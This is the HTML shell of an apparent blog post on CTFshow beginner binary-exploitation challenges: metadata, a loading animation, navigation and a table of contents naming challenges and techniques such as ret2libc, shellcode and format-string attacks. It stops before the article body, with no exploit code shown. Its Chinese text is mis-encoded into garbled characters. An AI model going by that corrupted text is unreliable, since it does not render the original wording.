<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="äºŒè¿›åˆ¶æ¼æ´ä¸åˆ©ç”¨ï¼ŒPWNå…¥é—¨_wrtieupï¼Œä¼šå‘˜å¥—é¤360é¢˜">
<title>CTFshow-å…¥é—¨PWN-writeup</title>

<link rel='canonical' href='https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/'>

<link rel="stylesheet" href="/scss/style.min.84f4364fa3a5758ecded3430d054d555b355a8e9efd1baf1e03c18d73802579f.css"><meta property='og:title' content="CTFshow-å…¥é—¨PWN-writeup">
<meta property='og:description' content="äºŒè¿›åˆ¶æ¼æ´ä¸åˆ©ç”¨ï¼ŒPWNå…¥é—¨_wrtieupï¼Œä¼šå‘˜å¥—é¤360é¢˜">
<meta property='og:url' content='https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/'>
<meta property='og:site_name' content='Expl0rer.Ct'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-08-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-12-04T02:03:27&#43;08:00'/><meta property='og:image' content='https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/ctfshow.png' />
<meta name="twitter:title" content="CTFshow-å…¥é—¨PWN-writeup">
<meta name="twitter:description" content="äºŒè¿›åˆ¶æ¼æ´ä¸åˆ©ç”¨ï¼ŒPWNå…¥é—¨_wrtieupï¼Œä¼šå‘˜å¥—é¤360é¢˜"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/ctfshow.png' />
    <link rel="shortcut icon" href="/favicon.ico" />
<div class="loading">
     
    <div id="ghost">
        <div id="red">
            <div id="pupil"></div>
            <div id="pupil1"></div>
            <div id="eye"></div>
            <div id="eye1"></div>
            <div id="top0"></div>
            <div id="top1"></div>
            <div id="top2"></div>
            <div id="top3"></div>
            <div id="top4"></div>
            <div id="st0"></div>
            <div id="st1"></div>
            <div id="st2"></div>
            <div id="st3"></div>
            <div id="st4"></div>
            <div id="st5"></div>
            <div id="an1"></div>
            <div id="an2"></div>
            <div id="an3"></div>
            <div id="an4"></div>
            <div id="an5"></div>
            <div id="an6"></div>
            <div id="an7"></div>
            <div id="an8"></div>
            <div id="an9"></div>
            <div id="an10"></div>
            <div id="an11"></div>
            <div id="an12"></div>
            <div id="an13"></div>
            <div id="an14"></div>
            <div id="an15"></div>
            <div id="an16"></div>
            <div id="an17"></div>
            <div id="an18"></div>
        </div>
        <div id="shadow"></div>
    </div>
</div>

<style>
    .loading {
        position: fixed;
        display: flex;
        justify-content: center;
        align-items: center;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 99;
        background-color: #f5f5fa;
        transition: opacity 0.5s ease;
    }
	
      
#ghost {
  position: relative;
  scale: 0.8;
}

#red {
  animation: upNDown infinite 1s;
  position: relative;
  width: 140px;
  height: 140px;
  display: grid;
  grid-template-columns: repeat(14, 1fr);
  grid-template-rows: repeat(14, 1fr);
  grid-column-gap: 0px;
  grid-row-gap: 0px;
  grid-template-areas:
    "a1  a2  a3  a4  a5  top0  top0  top0  top0  a10 a11 a12 a13 a14"
    "b1  b2  b3  top1 top1 top1 top1 top1 top1 top1 top1 b12 b13 b14"
    "c1 c2 top2 top2 top2 top2 top2 top2 top2 top2 top2 top2 c13 c14"
    "d1 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 d14"
    "e1 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 e14"
    "f1 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 top3 f14"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4 top4"
    "st0 st0 an4 st1 an7 st2 an10 an10 st3 an13 st4 an16 st5 st5"
    "an1 an2 an3 an5 an6 an8 an9 an9 an11 an12 an14 an15 an17 an18";
}

@keyframes upNDown {
  0%,
  49% {
    transform: translateY(0px);
  }
  50%,
  100% {
    transform: translateY(-10px);
  }
}

#top0,
#top1,
#top2,
#top3,
#top4,
#st0,
#st1,
#st2,
#st3,
#st4,
#st5 {
  background-color: red;
}

#top0 {
  grid-area: top0;
}

#top1 {
  grid-area: top1;
}

#top2 {
  grid-area: top2;
}

#top3 {
  grid-area: top3;
}

#top4 {
  grid-area: top4;
}

#st0 {
  grid-area: st0;
}

#st1 {
  grid-area: st1;
}

#st2 {
  grid-area: st2;
}

#st3 {
  grid-area: st3;
}

#st4 {
  grid-area: st4;
}

#st5 {
  grid-area: st5;
}

#an1 {
  grid-area: an1;
  animation: flicker0 infinite 1s;
}

#an18 {
  grid-area: an18;
  animation: flicker0 infinite 1s;
}

#an2 {
  grid-area: an2;
  animation: flicker1 infinite 1s;
}

#an17 {
  grid-area: an17;
  animation: flicker1 infinite 1s;
}

#an3 {
  grid-area: an3;
  animation: flicker1 infinite 1s;
}

#an16 {
  grid-area: an16;
  animation: flicker1 infinite 1s;
}

#an4 {
  grid-area: an4;
  animation: flicker1 infinite 1s;
}

#an15 {
  grid-area: an15;
  animation: flicker1 infinite 1s;
}

#an6 {
  grid-area: an6;
  animation: flicker0 infinite 1s;
}

#an12 {
  grid-area: an12;
  animation: flicker0 infinite 1s;
}

#an7 {
  grid-area: an7;
  animation: flicker0 infinite 1s;
}

#an13 {
  grid-area: an13;
  animation: flicker0 infinite 1s;
}

#an9 {
  grid-area: an9;
  animation: flicker1 infinite 1s;
}

#an10 {
  grid-area: an10;
  animation: flicker1 infinite 1s;
}

#an8 {
  grid-area: an8;
  animation: flicker0 infinite 1s;
}

#an11 {
  grid-area: an11;
  animation: flicker0 infinite 1s;
}

@keyframes flicker0 {
  0%,
  49% {
    background-color: red;
  }
  50%,
  100% {
    background-color: transparent;
  }
}

@keyframes flicker1 {
  0%,
  49% {
    background-color: transparent;
  }
  50%,
  100% {
    background-color: red;
  }
}

#eye {
  width: 40px;
  height: 50px;
  position: absolute;
  top: 30px;
  left: 10px;
}

#eye::before {
  content: "";
  background-color: white;
  width: 20px;
  height: 50px;
  transform: translateX(10px);
  display: block;
  position: absolute;
}

#eye::after {
  content: "";
  background-color: white;
  width: 40px;
  height: 30px;
  transform: translateY(10px);
  display: block;
  position: absolute;
}

#eye1 {
  width: 40px;
  height: 50px;
  position: absolute;
  top: 30px;
  right: 30px;
}

#eye1::before {
  content: "";
  background-color: white;
  width: 20px;
  height: 50px;
  transform: translateX(10px);
  display: block;
  position: absolute;
}

#eye1::after {
  content: "";
  background-color: white;
  width: 40px;
  height: 30px;
  transform: translateY(10px);
  display: block;
  position: absolute;
}

#pupil {
  width: 20px;
  height: 20px;
  background-color: blue;
  position: absolute;
  top: 50px;
  left: 10px;
  z-index: 1;
  animation: eyesMovement infinite 6s;
}

#pupil1 {
  width: 20px;
  height: 20px;
  background-color: blue;
  position: absolute;
  top: 50px;
  right: 50px;
  z-index: 1;
  animation: eyesMovement infinite 6s;
}

@keyframes eyesMovement {
  0%,
  49% {
    transform: translateX(0px);
  }
  50%,
  99% {
    transform: translateX(10px);
  }
  100% {
    transform: translateX(0px);
  }
}

#shadow {
  background-color: black;
  width: 140px;
  height: 140px;
  position: absolute;
  border-radius: 50%;
  transform: rotateX(80deg);
  filter: blur(20px);
  top: 80%;
  animation: shadowMovement infinite 1s;
}

@keyframes shadowMovement {
  0%,
  49% {
    opacity: 0.5;
  }
  50%,
  100% {
    opacity: 0.2;
  }
}

</style>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>


<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.pjax/2.0.1/jquery.pjax.min.js"></script>

<script>	
    function initLoading() {
        let loading = document.querySelector(".loading");
        document.addEventListener('DOMContentLoaded', function() {
            
            setTimeout(() => {
                loading.style.opacity = "0";
                
                setTimeout(() => {
                    loading.style.display = "none";
                }, 500);
            }, 500); 
        });
    }

    initLoading();
</script>


<link
  rel="stylesheet"
  href="https://cdn-font.hyperos.mi.com/font/css?family=MiSans:400:Chinese_Simplify,Latin&display=swap"
/>



<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaigbscreen.css" />

<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaigbscreenr.css" />

<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaiscreen.css" />

<link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.7.0/lxgwwenkaiscreenr.css" />


    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu_1a3c99934e119e1b.png" width="300"
                            height="268" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ«¡</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Expl0rer.Ct</a></h1>
            <h2 class="site-description">å¾å°†ä¸Šä¸‹è€Œæ±‚ç´¢</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://space.bilibili.com/695179979?spm_id_from=333.40138.0.0'
                        target="_blank"
                        title="Bilibili"
                        rel="me"
                    >
                        
                        
                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/Expl0rer-Ct'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>ä¸»é¡µ | Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E-about/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>å…³äº | About</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>å½’æ¡£ | Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>æœç´¢ | Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E6%8A%80%E6%9C%AF%E9%93%BE%E6%8E%A5-links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>æŠ€æœ¯é“¾æ¥ | Links</span>
            </a>
        </li>
        
        
        <li >
            <a href='/friends-links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>å‹æƒ…é“¾æ¥ | Friends Links</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <!--
tags: [temperature, hot, wheater, thermometer, forecast]
category: Weather
version: "1.73"
unicode: "f236"
-->
<svg
  xmlns="http://www.w3.org/2000/svg"
  width="32"
  height="32"
  viewBox="0 0 24 24"
  fill="none"
  stroke="#ff9500"
  stroke-width="1"
  stroke-linecap="round"
  stroke-linejoin="round"
  class="icon-tabler-sun-high"
>
  <path d="M14.828 14.828a4 4 0 1 0 -5.656 -5.656a4 4 0 0 0 5.656 5.656z" />
  <path d="M6.343 17.657l-1.414 1.414" />
  <path d="M6.343 6.343l-1.414 -1.414" />
  <path d="M17.657 6.343l1.414 -1.414" />
  <path d="M17.657 17.657l1.414 1.414" />
  <path d="M4 12h-2" />
  <path d="M12 4v-2" />
  <path d="M20 12h2" />
  <path d="M12 20v2" />
</svg>

                        <!--
tags: [night, dark mode]
category: Weather
version: "1.21"
unicode: "ece7"
-->
<svg
  xmlns="http://www.w3.org/2000/svg"
  width="32"
  height="32"
  viewBox="0 0 24 24"
  fill="none"
  stroke="#8d6e63"
  stroke-width="1"
  stroke-linecap="round"
  stroke-linejoin="round"
  class="icon-tabler-moon-stars"
>
  <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
  <path d="M17 4a2 2 0 0 0 2 2a2 2 0 0 0 -2 2a2 2 0 0 0 -2 -2a2 2 0 0 0 2 -2" />
  <path d="M19 11h2m-1 -1v2" />
</svg>

                        <span>æš—è‰²æ¨¡å¼</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ç›®å½•</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#test_your_nc">Test_your_nc</a>
      <ol>
        <li><a href="#pwn_000">PWN_000</a></li>
        <li><a href="#pwn_001">PWN_001</a></li>
        <li><a href="#pwn_002">PWN_002</a></li>
        <li><a href="#pwn_003">PWN_003</a></li>
        <li><a href="#pwn_004">PWN_004</a></li>
      </ol>
    </li>
    <li><a href="#å‰ç½®åŸºç¡€">å‰ç½®åŸºç¡€</a>
      <ol>
        <li><a href="#pwn_005">PWN_005</a></li>
        <li><a href="#pwn_006">PWN_006</a></li>
        <li><a href="#pwn_007">PWN_007</a></li>
        <li><a href="#pwn_008">PWN_008</a></li>
        <li><a href="#pwn_009">PWN_009</a></li>
        <li><a href="#pwn_010">PWN_010</a></li>
        <li><a href="#pwn_011">PWN_011</a></li>
        <li><a href="#pwn_012">PWN_012</a></li>
        <li><a href="#pwn_013">PWN_013</a></li>
        <li><a href="#pwn_014">PWN_014</a></li>
        <li><a href="#pwn_015">PWN_015</a></li>
        <li><a href="#pwn_016">PWN_016</a></li>
        <li><a href="#pwn_017">PWN_017</a></li>
        <li><a href="#pwn_018">PWN_018</a></li>
        <li><a href="#pwn_019">PWN_019</a></li>
        <li><a href="#pwn_020">PWN_020</a></li>
        <li><a href="#pwn_021">PWN_021</a></li>
        <li><a href="#pwn_021-1">PWN_021</a></li>
        <li><a href="#pwn_023">PWN_023</a></li>
        <li><a href="#pwn_024">PWN_024</a>
          <ol>
            <li><a href="#é¢˜ç›®">é¢˜ç›®ï¼š</a></li>
            <li><a href="#ä¸ç›®æ ‡ç¨‹åºäº¤äº’">ä¸ç›®æ ‡ç¨‹åºäº¤äº’</a></li>
            <li><a href="#äºŒè¿›åˆ¶æ•°æ®å¤„ç†">äºŒè¿›åˆ¶æ•°æ®å¤„ç†</a></li>
            <li><a href="#è¾…åŠ©æ¼æ´åˆ©ç”¨">è¾…åŠ©æ¼æ´åˆ©ç”¨</a></li>
            <li><a href="#å¯†ç å­¦ç›¸å…³è¾…åŠ©">å¯†ç å­¦ç›¸å…³è¾…åŠ©</a></li>
            <li><a href="#å¤šçº¿ç¨‹å’Œå¼‚æ­¥æ”¯æŒ">å¤šçº¿ç¨‹å’Œå¼‚æ­¥æ”¯æŒ</a></li>
            <li><a href="#é¢˜ç›®åç»­">é¢˜ç›®åç»­ï¼š</a></li>
            <li><a href="#é€è¡Œè§£ææ‰‹æ•²shellcode">é€è¡Œè§£ææ‰‹æ•²shellcode</a></li>
          </ol>
        </li>
        <li><a href="#pwn_025">PWN_025</a>
          <ol>
            <li><a href="#ret2libcæ”»å‡»">ret2libcæ”»å‡»</a></li>
            <li><a href="#ret2libcå®ç°æ­¥éª¤">ret2libcå®ç°æ­¥éª¤</a></li>
          </ol>
        </li>
        <li><a href="#pwn_026">PWN_026</a></li>
        <li><a href="#pwn_027">PWN_027</a></li>
        <li><a href="#pwn_028">PWN_028</a></li>
        <li><a href="#pwn_029">PWN_029</a></li>
        <li><a href="#pwn_030">PWN_030</a></li>
        <li><a href="#pwn_031">PWN_031</a></li>
        <li><a href="#fortifyç¼“å†²åŒºè¾¹ç•Œæ£€æŸ¥"><strong>FORTIFYç¼“å†²åŒºè¾¹ç•Œæ£€æŸ¥</strong></a></li>
        <li><a href="#pwn_032">PWN_032</a></li>
        <li><a href="#pwn_033">PWN_033</a></li>
        <li><a href="#pwn_034">PWN_034</a></li>
      </ol>
    </li>
    <li><a href="#æ ˆæº¢å‡º">æ ˆæº¢å‡º</a>
      <ol>
        <li><a href="#pwn_035">PWN_035</a></li>
        <li><a href="#binshåœ°å€çš„è·³è½¬åˆ©ç”¨"><strong>/bin/shåœ°å€çš„è·³è½¬åˆ©ç”¨</strong></a></li>
        <li><a href="#pwn_036">PWN_036</a></li>
        <li><a href="#pwn_037">PWN_037</a></li>
        <li><a href="#pwn_038">PWN_038</a></li>
        <li><a href="#pwn_039">PWN_039</a></li>
        <li><a href="#pwn_040">PWN_040</a></li>
        <li><a href="#32ä½å’Œ64ä½å¯æ‰§è¡Œç¨‹åºçš„å‚æ•°ä¼ é€’é¡ºåº"><strong>32ä½å’Œ64ä½å¯æ‰§è¡Œç¨‹åºçš„å‚æ•°ä¼ é€’é¡ºåº</strong></a></li>
        <li><a href="#pwn_041">PWN_041</a>
          <ol>
            <li><a href="#é¢˜ç›®-1">é¢˜ç›®ï¼š</a></li>
            <li><a href="#binshå’Œshçš„æ ¸å¿ƒåŒºåˆ«"><strong>/bin/shå’Œshçš„æ ¸å¿ƒåŒºåˆ«</strong></a></li>
          </ol>
        </li>
        <li><a href="#pwn_042">PWN_042</a></li>
        <li><a href="#pwn_043">PWN_043</a></li>
        <li><a href="#pwn_044">PWN_044</a></li>
        <li><a href="#pwn_045">PWN_045</a></li>
        <li><a href="#pwn_046">PWN_046</a></li>
        <li><a href="#pwn_047">PWN_047</a></li>
        <li><a href="#pwn_048">PWN_048</a></li>
        <li><a href="#pwn_049">PWN_049</a>
          <ol>
            <li><a href="#mprotectå‡½æ•°"><strong>Mprotectå‡½æ•°</strong></a></li>
          </ol>
        </li>
        <li><a href="#pwn_050">PWN_050</a></li>
        <li><a href="#pwn_051">PWN_051</a></li>
        <li><a href="#pwn_052">PWN_052</a></li>
        <li><a href="#ç±»canaryçˆ†ç ´"><strong>ç±»canaryçˆ†ç ´</strong></a></li>
        <li><a href="#pwn_053">PWN_053</a></li>
        <li><a href="#pwn_054">PWN_054</a>
          <ol>
            <li><a href="#æ€ä¹ˆåˆ¤æ–­ç»ˆæ­¢ç¬¦-x00-å­˜å‚¨åœ¨æ•°ç»„å†…éƒ¨"><strong>æ€ä¹ˆåˆ¤æ–­ç»ˆæ­¢ç¬¦ \x00 å­˜å‚¨åœ¨æ•°ç»„å†…éƒ¨ï¼Ÿ</strong></a></li>
          </ol>
        </li>
        <li><a href="#pwn_055">PWN_055</a></li>
        <li><a href="#è®¤è¯†32ä½å’Œ64ä½çš„shellcode"><strong>è®¤è¯†32ä½å’Œ64ä½çš„shellcode</strong></a></li>
        <li><a href="#pwn_056">PWN_056</a></li>
        <li><a href="#pwn_057">PWN_057</a>
          <ol>
            <li><a href="#å†…è”æ±‡ç¼–-syscall-linux---çš„ä½œç”¨">å†…è”æ±‡ç¼– <code>syscall; LINUX -</code> çš„ä½œç”¨</a></li>
          </ol>
        </li>
        <li><a href="#pwn_058">pwn_058</a></li>
        <li><a href="#pwn_059">PWN_059</a></li>
        <li><a href="#pwn_060">PWN_060</a></li>
        <li><a href="#çµæ´»æŒæ§shellcodeé•¿åº¦"><strong>çµæ´»æŒæ§shellcodeé•¿åº¦</strong></a></li>
        <li><a href="#pwn_061">PWN_061</a></li>
        <li><a href="#pwn_062">PWN_062</a></li>
        <li><a href="#pwn_063">PWN_063</a></li>
        <li><a href="#pwn_064">PWN_064</a></li>
        <li><a href="#pwn_065">PWN_065</a></li>
        <li><a href="#pwn_066">PWN_066</a></li>
        <li><a href="#nop-sledç©ºæ“ä½œé›ªæ©‡"><strong>nop sledç©ºæ“ä½œé›ªæ©‡</strong></a></li>
        <li><a href="#pwn_067">PWN_067</a></li>
        <li><a href="#pnw_068">PNW_068</a></li>
        <li><a href="#pwn_069">PWN_069</a></li>
        <li><a href="#pwn_070">PWN_070</a></li>
        <li><a href="#ret2syscall"><strong>ret2syscall</strong></a></li>
        <li><a href="#pwn_071">PWN_071</a></li>
        <li><a href="#pwn_072">PWN_072</a></li>
        <li><a href="#pwn_078">PWN_078</a></li>
        <li><a href="#pwn_073">PWN_073</a></li>
        <li><a href="#one_"><strong>one_gadgetæ”»å‡»</strong></a></li>
        <li><a href="#pwn_074">PWN_074</a></li>
        <li><a href="#æ ˆè¿ç§»"><strong>æ ˆè¿ç§»</strong></a>
          <ol>
            <li><a href="#åŸç†">åŸç†</a></li>
          </ol>
        </li>
        <li><a href="#pwn_075">PWN_075</a></li>
        <li><a href="#pwn_076">PWN_076</a></li>
        <li><a href="#pwn_077">PWN_077</a></li>
        <li><a href="#ret2regæ”»å‡»"><strong>ret2regæ”»å‡»</strong></a></li>
        <li><a href="#pwn_079">PWN_079</a></li>
        <li><a href="#pwn_080å¾…å®š">PWN_080ï¼ˆå¾…å®šï¼‰</a></li>
        <li><a href="#pwn_081">PWN_081</a></li>
        <li><a href="#ret2dllresolveæ”»å‡»"><strong>ret2dllresolveæ”»å‡»</strong></a></li>
        <li><a href="#pwn_082">PWN_082</a></li>
      </ol>
    </li>
    <li><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²">æ ¼å¼åŒ–å­—ç¬¦ä¸²</a>
      <ol>
        <li><a href="#pwn_091">PWN_091</a></li>
        <li><a href="#pwn_092">PWN_092</a></li>
        <li><a href="#pwn_093">PWN_093</a></li>
        <li><a href="#pwn_094">PWN_094</a></li>
        <li><a href="#pwn_095">PWN_095</a></li>
        <li><a href="#pwn_096">PWN_096</a></li>
        <li><a href="#pwn_097">PWN_097</a></li>
        <li><a href="#pwn_098">PWN_098</a></li>
        <li><a href="#pwn_099">PWN_099</a></li>
        <li><a href="#pwn_100">PWN_100</a></li>
      </ol>
    </li>
    <li><a href="#æ•´æ•°å®‰å…¨">æ•´æ•°å®‰å…¨</a>
      <ol>
        <li><a href="#pwn_101">PWN_101</a></li>
        <li><a href="#pwn_102">PWN_102</a></li>
        <li><a href="#pwn_103">PWN_103</a></li>
        <li><a href="#pwn_104">PWN_104</a></li>
        <li><a href="#pwn_105">PWN_105</a></li>
        <li><a href="#pwn_106">PWN_106</a></li>
        <li><a href="#pwn_107">PWN_107</a></li>
        <li><a href="#pwn_108å¾…å®š">PWN_108ï¼ˆå¾…å®šï¼‰</a></li>
        <li><a href="#pwn_109fmt">PWN_109ï¼ˆFMTï¼‰</a></li>
        <li><a href="#pwn_110">PWN_110</a></li>
      </ol>
    </li>
    <li><a href="#bypasså®‰å…¨æœºåˆ¶">Bypasså®‰å…¨æœºåˆ¶</a>
      <ol>
        <li><a href="#pwn_111">PWN_111</a></li>
        <li><a href="#pwn_112">PWN_112</a></li>
        <li><a href="#pwn_113å¾…å®š">PWN_113ï¼ˆå¾…å®šï¼‰</a></li>
        <li><a href="#pwn_114">PWN_114</a></li>
        <li><a href="#pwn_115">PWN_115</a></li>
        <li><a href="#pwn_116">PWN_116</a></li>
        <li><a href="#pwn_117">PWN_117</a></li>
      </ol>
    </li>
    <li><a href="#å †å‰ç½®åŸºç¡€">å †å‰ç½®åŸºç¡€</a>
      <ol>
        <li><a href="#pwn_135">PWN_135</a></li>
        <li><a href="#pwn_136">PWN_136</a></li>
        <li><a href="#pwn_137">PWN_137</a></li>
        <li><a href="#pwn_138">PWN_138</a></li>
        <li><a href="#pwn_139">PWN_139</a>
          <ol>
            <li></li>
          </ol>
        </li>
        <li><a href="#pwn_140">PWN_140</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/">
